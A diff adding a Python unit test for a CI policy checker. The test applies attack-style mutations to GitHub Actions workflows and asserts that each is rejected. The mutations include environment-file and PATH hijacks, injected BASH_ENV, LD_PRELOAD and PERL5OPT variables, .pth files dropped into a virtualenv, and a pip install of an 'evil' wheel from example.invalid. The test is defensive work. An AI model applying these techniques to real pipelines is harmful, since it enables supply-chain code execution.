@@ -453,6 +453,61 @@ class PolicyTests(unittest.TestCase):
                 shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
         self.assertEqual(check_policy.check(self.root), [])
 
+    def test_runner_file_environment_and_receipt_adjacency_probes_are_rejected(self):
+        """A-08 and A-10: context-named runner files, expression or shell start-up environments, and any step
+        between the terminal re-check and the receipt."""
+        import python_env
+        self.assertEqual(check_policy.check(self.root), [])
+        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
+        def index(data, run, jid='validate'): return next(i for i, s in enumerate(steps(data, jid)) if s.get('run') == run)
+        def insert_after(run, step, jid='validate'):
+            return lambda data: steps(data, jid).insert(index(data, run, jid) + 1, step)
+        def validator(data): return next(s for s in steps(data) if 'schemas/policy/v1alpha1/validate.py' in s.get('run', ''))
+        def set_env(scope, env):
+            def change(data):
+                target = data if scope == 'workflow' else data['jobs']['validate'] if scope == 'job' else validator(data)
+                target['env'] = env
+            return change
+        install, check = python_env.INSTALL_COMMAND, python_env.CHECK_COMMAND
+        expression = '${{ fromJSON(\'{"PYTHONPATH":"vendor"}\') }}'
+        mutations = [
+            ('design', 'N01 github.path', insert_after(install, {'run': 'echo "$RUNNER_TEMP/v2/bin" >> "${{ github.path }}"'})),
+            ('design', 'N02 github.env', insert_after(install, {'run': 'echo "PYTHONPATH=$PWD/vendor" >> "${{ github.env }}"'})),
+            ('design', 'mixed-case context', insert_after(install, {'run': 'echo dir >> "${{ GitHub.Path }}"'})),
+            ('design', 'indexed context', insert_after(install, {'run': 'echo dir >> "${{ github[\'path\'] }}"'})),
+            ('design', 'whole context', insert_after(install, {'run': 'echo dir >> "${{ fromJSON(toJSON(github)).path }}"'})),
+            ('design', 'action input', insert_after(install, {'uses': 'example/writer@' + 'a' * 40, 'with': {'file': '${{ github.env }}'}})),
+            ('design', 'job env carrying the path file', lambda d: d['jobs']['validate'].setdefault('env', {}).update(HOST_OS='${{ github.path }}')),
+            ('design', 'BASH_ENV through GITHUB_ENV', insert_after(install, {'run': 'echo "BASH_ENV=$PWD/x.sh" >> "$GITHUB_ENV"'})),
+            ('design', 'N05 copy into venv', insert_after(install, {'run': 'cp -r schemas/vendor/jsonschema "$RUNNER_TEMP/validator/lib/python3.14/site-packages/"'})),
+            ('design', 'N06 pth into venv', insert_after(install, {'run': 'printf \'import os\\n\' > "${{ runner.temp }}/validator/lib/python3.14/site-packages/zz.pth"'})),
+            ('design', 'admission step environment', lambda d: steps(d)[index(d, check)].update(env={'HOST_OS': 'x'})),
+            ('design', 'admission step plain bash', lambda d: steps(d)[index(d, check)].update(shell='bash')),
+            ('design', 'install step plain bash', lambda d: steps(d)[index(d, install)].update(shell='bash')),
+        ]
+        for scope in ('workflow', 'job', 'step'):
+            mutations.append(('design', f'N03/N04 {scope} env expression', set_env(scope, expression)))
+            for key in ('BASH_ENV', 'ENV', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'BASH_FUNC_python%%', 'PERL5OPT'):
+                mutations.append(('design', f'{scope} {key}', set_env(scope, {key: 'scripts/ci/fixtures/shell-env.sh'})))
+        mutations += [
+            ('design', 'N07 python3 after re-check', insert_after(check, {'run': 'python3 schemas/policy/v1alpha1/validate.py'})),
+            ('design', 'N08 shell python after re-check', insert_after(check, {'shell': 'python {0}', 'run': 'import runpy\nrunpy.run_path("schemas/policy/v1alpha1/validate.py")\n'})),
+            ('design', 'N09 installer shell', insert_after(install, {'shell': 'python -m pip install -r {0}', 'run': 'evil @ https://example.invalid/evil-1.0-py3-none-any.whl'})),
+            ('design', 'action between re-check and receipt', insert_after(check, {'uses': 'example/tool@' + 'a' * 40})),
+            ('design', 'shell step between re-check and receipt', insert_after(check, {'run': 'true'})),
+            ('ci', 'copy and PATH between aggregate re-check and verifier', insert_after(check, {
+                'run': 'cp -a "$RUNNER_TEMP/validator" "$RUNNER_TEMP/v2" && echo "$RUNNER_TEMP/v2/bin" >> "${{ github.path }}"'}, 'ci-required')),
+            ('ci', 'ci-contracts step between re-check and receipt', insert_after(check, {'run': 'true'}, 'ci-contracts')),
+            ('bootstrap', 'bootstrap step between re-check and receipt', insert_after(check, {'shell': 'bash', 'run': 'python3 -c 1'})),
+            ('copilot-code-review', 'Copilot step after re-check', lambda d: steps(d, 'copilot-setup-steps').append({'run': 'python3 -c 1'})),
+        ]
+        for name, label, change in mutations:
+            with self.subTest(mutation=label):
+                self.mutate(name, change)
+                self.assertTrue(check_policy.check(self.root), label)
+                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
+        self.assertEqual(check_policy.check(self.root), [])
+
     def test_windows_runner_selection(self):
         jobs = (
             {'runs-on': 'windows-2025'},
